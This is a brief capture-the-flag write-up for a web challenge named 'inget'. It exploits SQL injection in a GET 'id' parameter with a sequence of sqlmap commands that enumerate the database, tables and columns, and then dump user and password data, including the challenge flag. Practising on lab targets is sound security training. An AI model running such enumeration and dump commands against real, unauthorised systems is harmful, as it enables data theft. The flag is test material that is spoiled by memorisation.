## inget

打开场景 Please enter ID,and Try to bypass

---

get参数注入  “ID” 尝试sql注入

kali sqlmap
```
sqlmap -u http://61.147.171.105:61299/?id=1 --current-db
sqlmap -u http://61.147.171.105:61299/?id=1 -C cyber --tables
sqlmap -u http://61.147.171.105:61299/?id=1 -C cyber -T cyber --columns
sqlmap -u http://61.147.171.105:61299/?id=1 -C cyber -T cyber -C"pw,user,Id" --dump
```
```
user            | pw                                           | Id |
+-----------------+----------------------------------------------+----+
| congratulations | cyberpeace{80c0821857c5e0537860f2d138c1aee7} | 3  |
+-----------------+----------------------------------------------+----+
```